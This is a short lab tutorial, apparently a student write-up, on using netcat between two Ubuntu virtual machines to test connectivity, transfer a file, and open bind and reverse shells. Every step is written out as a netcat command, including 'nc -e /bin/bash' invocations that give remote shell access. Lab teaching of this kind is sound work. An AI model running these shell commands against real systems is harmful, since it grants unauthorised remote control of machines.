## Bind and Reverse Shells - Ubuntu(VM)

At the first step we need to run two hosts on two different virtual machines. So we name the first host Alice and second Bob. Now we want to make sure the both sides can see eachother so we run the ping command on both ends. On each machine 
On each VM, while still connected to NAT, we execute the following command "apt-get install netcat" then "sudo update-alternatives --config nc" (and select option 2, nc.traditional, when prompted)
Next step we put each VM on the Host-Only Adapter network. Each should have an IP like 192.168.56.101.

We need to make sure the devices can ping each other
Record and keep the IPv4 IP Address of Bob 
Record and keep the IPv4 IP Address of Alice 


### Testing the first communication between two hosts

On Alice's computer we execute "nc -nlvp 4444 then on Bob's execute nc -nv ip.address.of.alice 4444

### Transferring files between two hosts

At alice, we execute this command: echo “Secret Message” > payload.txt
Next at bob, we execute: nc –nlvp 4444 > fromAlice.txt
Then at alice, we execute: nc –nv ip.addr.of.bob 4444 < payload.txt
When the transmission is finished, type CTRL-C on alice’s side

### Bind Shell 
At alice, we execute: touch foo.bar (to make a file named foo.bar in current directory)
At alice, we execute: nc –nlvp 4444 –e /bin/bash
At bob, we execute: nc –nv ip.addr.of.alice 4444
At bob, we type “ls” and press enter
At bob, we type “whoami” and press enter

### Reverse Shell
At alice, we execute: nc –nlvp 4444
At bob, we execute: nc –nv ip.addr.of.alice 4444 –e /bin/bash
When connected, at alice, we type “whoami” and press enter
At alice, we type “ls” and press enter

At the end we can see the files are trasferrring between two hosts with commands on Ubuntu.
